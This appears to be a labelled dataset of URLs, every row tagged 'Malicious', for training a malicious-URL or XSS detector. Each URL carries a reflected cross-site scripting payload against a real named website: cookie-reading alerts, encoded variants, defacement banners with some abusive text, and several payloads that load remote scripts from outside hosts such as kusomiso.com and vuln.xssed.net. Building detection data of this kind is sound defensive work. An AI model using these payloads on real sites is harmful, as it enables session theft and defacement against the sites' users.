https://secure.acton.org/bookshoppe/main/products.php?words=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.djclaus.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hayem.org/index.htm?what=a&amp;p=103&amp;go=1&amp;q=%22%3e%3cfont%20color=red%20size=55%3efuck%20arme<br>nia%20xssed%3c/font%3e%3cbr%3e%3cimg%20width=1000%20height=1000%20src=http://www.konyatanitim.com/ha<br>ber/images/haberresim/hackerlar[1].jpg%3e%3cstyle%3ebody{background:url(http://www.konyatanitim.com/<br>haber/images/haberresim/hackerlar[1].jpg);}%3c/style%3e,Malicious
http://www.artmedic-phpscripts.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sourcecodeguru.com/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
http://www.concern.net/search.php?ph=%22%3e%3cscript%3ealert%281%29%3b%3c%2fscript%3e,Malicious
"http://ifc.mit.edu/calendar/calendar.php?year=2007&amp;month=';alert(string.fromcharcode(83,69,67,85,82,<br>73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;aler<br>t(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,<br>69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://portal.vodafone.gr/vodafonenet/register/newregister/holssologin.jsp?action2=&quot;&gt;&lt;script&gt;alert('<br>xss')&lt;/script&gt;,Malicious
http://web1.kariyer.net/jobsearch/detayliarama.kariyer?arn=&amp;sid=&quot;&gt;&lt;script&gt;alert(&quot;ulan+ne+tenekesiniz<br>&quot;)&lt;/script&gt;,Malicious
"http://derstandard.at/?url=%3c/script%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3<br>e%3cscript%3e",Malicious
http://software.acer.net/products/products.asp?fid=12&amp;fname=acronis&lt;iframe+src=&quot;http://xssed.com&quot;&gt;&lt;/<br>iframe&gt;,Malicious
http://www.yourhealth.gov.au/internet/yourhealth/publishing.nsf/content/search-results-1?opendocumen<br>t&amp;freetext=%3cscript%3ealert%28%22xss+by+prashant%22%29%3c/script%3e&amp;submit=search,Malicious
http://miranda.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
http://www.matthias-buder.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.sodimac.cl/webapp/commerce/command/execmacro/sodimacvc/macros/ma&lt;script&gt;alert(/xss/);&lt;/s<br>cript&gt;in.d2w/report,Malicious
http://www.lac-bac.gc.ca/structures/parlement/002034-119.01-f.php?image_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)<br>&lt;/script&gt;,Malicious
http://www.vbulletin.org/forum/forumdisplay.php?f=228&amp;threadprefix=%3cscript%3ealert(document.cookie<br>);%3c/script%3e,Malicious
http://ms105.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.cbp.gov/xp/cgov/printme.xml?xml=$/content/import/duty_rates_hts/drawback/texport.ctt&amp;loca<br>tion=%22%3cscript%3ealert('xss%20from%20sshjason');%3c/script%3e,Malicious
http://locoboard.jp/pass.php?mode=pass&amp;id=&amp;mail='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://www.situationalleadership.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.submarino.com.br/homecache/allsearchnotfound.aspx?query=&lt;script&gt;alert(&quot;xroot owned<br>you!&quot;)&lt;/script&gt;,Malicious
http://www.journaux.fr/preachat.php?id=83886&amp;collec=0&amp;sousfamille=135'%22%3e%3c/title%3e%3cscript%3e<br>alert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.leprovoc.com/media/storage/paper453/news/2008/10/01/artsentertainment/my.best.friends.gir<br>l.not.the.best.romantic.comedy-3467181.shtml%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.<br>source))%3b%3c/script%3e%7d%3c/style%3e%3cscript%3ea=eval%3bb=alert%3ba(b(/xss/.source))%3b%3c/scrip<br>t%3e,Malicious
http://help.forumotion.com/report_abuse.forum?page=&quot; onmouseover=alert(1);&gt;&lt;h1&gt;mouseover<br>here!!!!!&amp;report=1,Malicious
http://www.intota.com/multisearch.asp?strsearchtype=all&amp;strquery=%22%3e%3cbody+onload=alert(%22by%20<br>encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3<br>e,Malicious
http://www.mnttoppa.com/pages.asp?kw=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www14.software.ibm.com/webapp/download/search.jsp?dt=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cooki<br>e)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://www.sumbarprov.go.id/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.cartaexpressa.com.br/adserver/remove_email.php?email=%3cscript%3ealert(666)%3c/script%3e,Malicious
"http://mobile.seisyun.net/cgi/jump/2/kusomiso.com/%3cscript%3ealert(string.fromcharcode(66,121,32,10<br>7,117,115,111,109,105,115,111,46,99,111,109))%3c/script%3e",Malicious
http://web2.kariyer.net/teknikdestek/sifremi_unuttum.kariyer?arn=&amp;sid=%22%3e%3cscript%3ealert(%22ula<br>n+ne+tenekesiniz%22)%3c/script%3e,Malicious
http://www.geschenkidee.ch/de/searchresults.html?q=&lt;/title&gt;&quot;;&lt;/script&gt;&lt;script&gt;alert(document.cookie)<br>;&lt;/script&gt;&lt;script&gt;test=&quot;1,Malicious
http://learn.iis.net/themes/iis/pages/search.aspx?q=ssl%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%<br>3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.challenges.fr/recherche/?q=/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;&lt;script<br>type=&quot;text/javascript&quot; src=&quot;http://yourjavascript.com/27544112151/xss.atmon3r.js&quot;&gt;&lt;/script&gt;,Malicious
http://www.thaitrademe.com/classifieds/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.heritage.com/shared-content/search/?search=go&amp;l=25&amp;d1=180+days+ago&amp;d2=today&amp;s=relevance&amp;q<br>=--%3e%3cimg+src%3d%22logo_.png%22+onerror%3d%22alert%28document.cookie%29%22+f%3d&amp;submit=go,Malicious
http://belcro.net/wiki/flash/actionscript/3.0/textfield+stylesheet%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.bitkiselaktar.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/s<br>cript%3e,Malicious
https://www.americanexpress.com/home/search/rtn_proxy.cgi?url=http://help.custhelp.com/cgi-bin/help.<br>cfg/php/enduser/opensearch.php?p_pv=&amp;p_cv=2.1050&amp;faq_source=layer&amp;startindex=0&amp;count=5&amp;callback=%22%<br>3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.mutlupartner.tv/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/scr<br>ipt%3e,Malicious
http://www.name.com/tools/get_password.php?domain_name=%27%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3eaaa&amp;submit.x=0&amp;submit.y=0,Malicious
http://www.wuxuan.gov.cn/news_show.asp?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.gametrailers.com/tgs2k7.php?p=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%7<br>4%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31<br>%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%<br>31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://games.playzone.co.il/search.php?q=%3c%3cscript%3ealert(%22resistance%22)%3b%2f%2f%3c%3c%2fscr<br>ipt%3e&amp;x=41&amp;y=7,Malicious
http://stores.musictoday.com/store/default.asp?band_id=872&amp;sfid=2&amp;mailsubmit=%22%3e%3cbody/onload=al<br>ert(/xss/)%3e,Malicious
"http://libguides.sbuniv.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';alert<br>(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromcharcod<br>e(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://earth.0rn.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://www.t-zones.co.uk/web/downloads/en/downloads/index/searchresult.jsp?searchgroupid=all&amp;searchk<br>eywords=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(s<br>tring.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;x=0&amp;y=0",Malicious
http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://rackportal.com/home.php?l=en&amp;token=s0hepzzcsd0kewi0m-lk17ioahudvbokhe4og0oyayaamivwoam4fq&amp;q='<br>%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
"http://mypyramid.gov/mypyramid/results.html?name=undefined&amp;age=24&amp;gender=female&amp;weight=';alert(strin<br>g.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88<br>,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(s<br>tring.fromcharcode(88,83,83))%3c/script%3e&amp;heightfeet=6&amp;heightinch=4&amp;activity=low&amp;weightn=126&amp;height<br>feetn=6&amp;heightinchn=4&amp;validweight=1&amp;validheight=1&amp;",Malicious
http://www.cdi.ensp.unl.pt/docbweb/plinkres.asp?base=isbd&amp;form=&amp;startrec=0&amp;recpag=5&amp;newsearch=1&amp;sear<br>chtxt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://portal.mec.gov.br/iframe.php?strrastro=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdp<br>arty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.ercmakina.com/galeri/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://anscigallery.nal.usda.gov/search.php?action=basic&amp;keywords=%27%3balert%28string.fromcharcode%<br>2888%2c83%2c83%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert<br>%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83<br>%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%2<br>9%29%3c%2fscript%3e&amp;search_options%5b%5d=display_name&amp;search_options%5b%5d=subject_keywords&amp;search_o<br>ptions%5b%5d=description&amp;search_options%5b%5d=original_creator&amp;search_options%5b%5d=digital_creator&amp;<br>search_options%5b%5d=publisher&amp;search_options%5b%5d=source_relation&amp;search_options%5b%5d=spatial_loc<br>ation&amp;search_options%5b%5d=language&amp;submit=begin+search,Malicious
http://tempoagora.uol.com.br/busca?frmcidprocura3=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xsse<br>d.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e,Malicious
http://reports.internic.net/cgi/whois?whois_nic=%3cscript%3ealert(%22internic.net xssed |<br>hexspirit%22)%3c/script%3e&amp;type=domain,Malicious
http://47.xmbs.jp/d_res.php?id=huna&amp;c_num=26841'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e<br>%3c/script%3e&amp;n=1816427&amp;view=1&amp;pnum=mte5mdm2ntmxmw%3d%3d,Malicious
http://icsd.ornl.gov/index.php?action=search&amp;spaceg=%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e&amp;wyckoff=%22%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e%22,Malicious
http://www.aolfeedback-clarabridge.com/se.ashx?s=04bd76cc65a7bb3c&amp;tid=&quot;&gt;&lt;script&gt;document.location='h<br>ttp://xssed.com';&lt;/script&gt;&amp;r=&quot;&gt;&lt;script&gt;alert(&quot;xssed&quot;)&lt;/script&gt;&amp;success=yes&amp;ch=&amp;oid=&amp;c=en-us,Malicious
http://www.spamfighter.com/search_default.asp?submit=search&amp;q=test&quot;&gt;&lt;/a&gt;&lt;script&gt;alert('macafee<br>secure my ass');&lt;/script&gt;,Malicious
http://charges.uol.com.br/arquivo.php?busca=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thirdpar<br>ty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.in.gr/directory/search.asp?lngmode=2&amp;wordsall=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://laboutique.airfrance.fr/produitliste.php?id_recherche=7%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.imgovi.com/fr/detail.php?id=%22%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://sexoffenders.ehawaii.gov/sexoff/list.jsp?sor_record_type=so&amp;lname=%3cscript%3ealert(/xss/);%3<br>c/script%3e&amp;fname=%3cscript%3ealert(/xss/);%3c/script%3e&amp;zip=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%<br>2fscript%3e&amp;street=%3cscript%3ealert%28%2fxss%2f%29%3b%3c%2fscript%3e,Malicious
http://articles.christiansunite.com/articles.cgi?terms=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://www.thejeffwilsonexperience.com/blog/wp-content/plugins/comment-rating/ck-processkarma.php?id<br>=14&amp;action=add&amp;path=&amp;path=/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://search.sportsnet.ca/search.asp?query=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdparty/scri<br>pts/hotpockets.js%3e,Malicious
http://showing.com/search/videos/?s=%22%3e%3cscript%3ealert(%27xssed%27)%3c/script%3e,Malicious
http://www.avemaria.edu/shop/shopcustadmin.asp?msg=%3cscript%3ealert('by%20codes%201923turk%20grup')<br>;%3c/script%3e,Malicious
http://book.qantas.com.au/pl/qfservicing/wds/flifoinfoservlet?site=qfqfqfsd&amp;language=gb&amp;b_date=20201<br>1291425&amp;b_location=syd&amp;e_location=adl&amp;airline_code=qf&amp;flight_number=759&amp;equipment=bo%22/%3e%3cbody%2<br>0onload=%22alert%281%29%22%3e%3cscript%3ealert%281%29;%3c/script%3e%3cinput%3exxx?eing%20767-300/300<br>er&amp;equipment_code=76%22/%3e%3cinput%3e%3e%3cbody%20onload=%22alert%281%29%22%3e%3cscript%3ealert%281<br>%29;%3c/script%3exx3&amp;duration=0%22/%3e%3cinput%3exx,Malicious
http://www.kuplucekoyu.org.tr/link/default.asp?page=search&amp;kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious
http://www.militaria.nl/shop.php?categorie=26/shop.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(133<br>7)%3c/script%3e,Malicious
http://wiki.nasa.gov/cm/newui/wiki/pagelisting.jsp?listtype=search&amp;projectname=federal%20knowledge%2<br>0management%20working%20group%20(kmwg)&amp;searchtext=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%<br>2fscript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.santosfc.com.br/erro.asp?msg=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.lazul.com/?mnu='%3e%22%3e'%3e%3cscript%3ealert(%22xssed.com%22)%3c/script%3e,Malicious
http://www.gmek-kkm.ru/_publications/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://s1.asmandez.ir/login.php/%22%27%3e%3c/a%3e%3cscript%3ealert%28/securitylab/%29%3c/script%3e,Malicious
http://pt.u21fantasy.uefa.com/m/dreamteam.mc?event=0&view=graphical&id=2%3e%22%3e%3cscript%20%0a%0d%3ealert(%27xss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20:d%27)%3b%3c/script%3e%3ch1%3exss%20by%20turkpower%20-%20from%20turkey%20-%20hello%20uefa%20%20:d%3c/h1%3e%3c/marquee%3e,Malicious
http://op-webtools.web.cern.ch/op-webtools/vistar/vistars.php?usr=psb&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,Malicious
http://www.vadicicekevi.com/index.php?pages=product&amp;op=3e%22%3e%3cscript%20%0a%0d%3ealert(document.c<br>ookie)%3b%3c/script%3e,Malicious
http://fotoboek.daalmans.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://althaus.be/cgi-bin/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.yemekyerim.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious
http://www.radikal.com.tr/arama.php?tarih=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;hacked%20by%2<br>0dylebron&lt;/h1&gt;,Malicious
http://www.asai.co.za/forum.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.hulhanegra.rs.gov.br/php/busca.php?busca=noticias&amp;palavra=%22%3e'%3e%3cscript%20src=http:<br>//vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e&amp;pesquisa=exata&amp;submit=ok,Malicious
http://www.combust.cn/cgi-bin/register.cgi?forum=71%22%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://kenai.com/projects?q=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e&amp;commit=sea<br>rch,Malicious
http://www.everpower.org/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cookie);<br>%3c/script%3e,Malicious
http://www.cyberhaber.com/?month=9&amp;day=8&amp;year=2007%22%3e%3ch1%3exssed%3c/h1%3e%3cscript%3ealert(1)%3<br>c/script%3e,Malicious
http://service.govdelivery.com/service/edition_push.html?document_id=15133&amp;edition_id=%22%3e%3cscrip<br>t+src=http://starext.by.ru/lt.js%3e,Malicious
http://www.shopparos.gr/results.asp?q=%22%3c/title%3e%3cscript%3ealert%28%22xss%20by%20d@ydream%22%29;%3c/script%3e,Malicious
"http://www.tradeindia.com/search/product_search.html?search_form_id=18&keyword=""/><script>alert(""xss: vijayendra"")</script>&criteria=product&submit.x=0&submit.y=0",Malicious
http://ads.tripod.lycos.co.uk/ad/google/frame.php?_url=%3c/script%3e%3cscript%3ealert(document.cooki<br>e)%3c/script%3e,Malicious
http://info.alexa.com/data/details/main?url=http://kusomiso.com/'%3e%22%3e%3c/script%3e%3cscript/src<br>=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.fcs.uga.edu/ext/pubs/food.php?category=preserving%22%3e%22%3e/r0hit/%3e%3cscript%3ealert(<br>document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script%3e,Malicious
http://www.fatsailkogretim.k12.tr/okulfotolari/resimler/buyukresimler/foto.asp?stil=stil20&amp;resim=&quot;&gt;&lt;<br>script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious
http://acerfr.oberon-media.com/category.htm?code=1007&amp;refid=%20%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/ma<br>rquee%3e&amp;origin=leftbar_cat%20}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%<br>3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.darty.com/webapp/wcs/stores/servlet/dartysearchengineview?storeid=10001&amp;crit%40=%22%3e%3c<br>marquee%3e%3ch1%3edefaced+by+ironzorg%3c%2fh1%3e%3c%2fmarquee%3e&amp;uni=&amp;imagefield33.x=3&amp;imagefield33.<br>y=11,Malicious
http://www.komikon.net/ara.php?filtre=2&amp;&amp;sayfa=12&amp;kelime=%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e,Malicious
http://info.ingres.com/g/?k83hptv4cr=clicksrc:ingres%22/%3e%3cscript%3ealert%28%27wooo%27%29;%3c/scr<br>ipt%3exxxx,Malicious
http://www.inonu.edu.tr/bilgi/harf.php?harf=l=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;marquee&gt;thr0<br>ad&lt;/marquee&gt;,Malicious
http://www-ssrl.slac.stanford.edu/~mgeorge/webfilebrowser.php?subdir=&sortby=name&msg=%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e,Malicious
http://voinovich.senate.gov/public/index.cfm?fuseaction=search.results&amp;keywords=%22%22%3e%3e%3c%3c%2<br>fscript%3e%3cimg+%22%22%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e%22%3e%3e%3c%3cbody+onlo<br>ad%3dprompt%28document.domain%29%3e&amp;x=10&amp;y=9,Malicious
http://www.kitre.com/igallery33/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://sistemadif.jalisco.gob.mx/ley%20de%20transparencia/directorio2a.php?cod_consecutivo=%22%3e%3c<br>script%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.guatemala.gob.gt/discurso.php?codigo=1154&amp;tipo=%22%3e%3cscript%3ealert(/xssed!/);%3c/scri<br>pt%3e,Malicious
http://www.pablochopper.com/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://akpartiseferihisar.com/resim_galerisi/login.asp?n=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://globoesporte.globo.com/esp/home/0,,4355,00.html?q=%3cscript%3ealert('pwned')%3c/script%3e&amp;op=<br>fotos",Malicious
http://www.pbs.org/nbr/info/search.html?q=%22%3cscript%3ealert(%22found%20by%20hotpockets%20of%20bac<br>kslashsecurity.org%22)%3c/script%3e,Malicious
http://bbs.kabubu.net/2ch/test/search.cgi?bbs=c%00%22%22%3cscript%3ealert('xss');%3c/script%3e&amp;keywo<br>rd=,Malicious
http://www.bored.tv/search_result.php?search_id=%22%3e%3cmarquee%3e%3ch1%3edefaced+by+ironzorg%3c%2f<br>h1%3e%3c%2fmarquee%3e&amp;search_type=search_videos&amp;search_for=any,Malicious
http://www.cusnapoli.org/public/igallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.megite.com/discover/http://www.xssed.com/'%3e%3e%3cscript%3ealert(%22xss%20by%20kusomiso.<br>com%22)%3c/script%3e,Malicious
http://adult.agesage.jp/categorypage.html?ccd=bisyojo%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkuso<br>miso%2ecom%2fxss%2ejs%3e%3c%2fscript%3e&amp;sort=posted_on&amp;page=6,Malicious
http://registrar.verisign-grs.com/cgi-bin/whois?whois_nic=%3cbr%3ehi+xssed.com!%3cbr%3e%3ciframe%20s<br>rc=http://xssed.com%3e&amp;x=20&amp;y=7&amp;type=domain,Malicious
"http://kb.kaspersky.fr/?cible=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(107, 73, 110, 71, 111, 70, 99, 72,<br>97, 79, 115, 32, 105, 83, 32, 100, 65, 32, 98, 101, 83, 116, 32, 70, 117, 99, 75, 32, 84, 104, 101,<br>32, 82, 101, 115, 84, 33, 33, 33));&lt;/script&gt;&lt;!--&amp;findstring=",Malicious
http://www.allspeedperformance.com/gallery.php?id=1%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.bitlet.org/?torrent=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious
http://www.publicarclasificados.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;ma<br>rquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.gcee.org/messageboard/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://www.web-arama.com/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/scr<br>ipt%3e,Malicious
https://ccnet.utoronto.ca/cgi-bin/course.cgi?cc=20071/fre385h1s&amp;action=announcement_menu%22%3e'%3e%3<br>cscript%3ealert('xss')%3c/script%3e,Malicious
"http://filmtrailer.msn.se/index.php?module=filmnews&operation=""><script>alert(document.cookie)</script>",Malicious
"http://buyingcozaar.org/search.php?search_text=/""><script>alert(1)</script>&i1.x=3&i1.y=11",Malicious
http://www.nsf.gov/publications/pub_summ.jsp?ods_key=%3cscript%3ealert(%22xroot%20owned%20you!%22)%3<br>c/script%3e%3cbr%3e%3cbr%3e%3cbr%3e%3cbr%3exroot,Malicious
http://www.seniors.gc.ca/s.2.1rchaz@.jsp?ltr=%22%3e%3c/title%3e%3cscript%3ealert(/xss%20by%20warvect<br>or/);%3c/script%3e%3ccenter%3e%3cp%20style=background-color:red;%20color:white;%3e%3cimg%20src=http:<br>//warvector.u7n.org/images/logo.gif%3e%3cmarquee%3e%3ch1%3exss%20by%20warvector%20=)%3c/h1%3e%3c/mar<br>quee%3e%3c/p%3e,Malicious
